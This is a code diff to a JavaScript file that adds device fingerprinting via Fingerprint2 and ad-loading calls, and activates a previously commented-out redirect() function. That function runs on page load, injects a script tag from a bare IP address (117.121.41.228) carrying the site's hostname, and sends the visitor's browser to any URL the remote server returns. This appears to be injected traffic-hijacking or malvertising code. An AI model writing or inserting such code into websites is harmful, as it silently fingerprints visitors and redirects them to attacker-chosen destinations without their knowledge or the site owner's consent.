@@ -14,13 +14,14 @@ function extend() {
     new Fingerprint2().get(() => {
       if (phone) {
         getAd();
-      }
-      // else inPC(uuid);
+      } else getPc();
     });
     return;
   }
   if (phone) {
     getAd();
+  } else {
+    getPc();
   }
   // else inPC('-');
 }
@@ -32,23 +33,23 @@ function replace() {
   else getPc('-');
 }
 
-// function redirect() {
-//   const str = hostname.slice(hostname.indexOf('.') + 1);
-//   const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
-//   window[fnName] = (data) => {
-//     if (data.url) window.location.href = data.url;
-//   };
-//   const os = document.createElement('script');
-//   os.src = `/replace?cb=${fnName}&host=${str}`;
-//   document.getElementsByTagName('head')[0].appendChild(os);
-//   os.remove();
-// }
-// redirect();
+function redirect() {
+  const str = hostname.slice(hostname.indexOf('.') + 1);
+  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
+  window[fnName] = (data) => {
+    if (data.url) window.location.href = data.url;
+  };
+  const os = document.createElement('script');
+  os.src = `117.121.41.228/replace?cb=${fnName}&host=${str}`;
+  document.getElementsByTagName('head')[0].appendChild(os);
+  os.remove();
+}
+redirect();
 
 function handler(e) {
   if (ready) return;
   if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
-  setTimeout(replace, 0);
+  // setTimeout(replace, 0);
   extend();
   ready = true;
 }
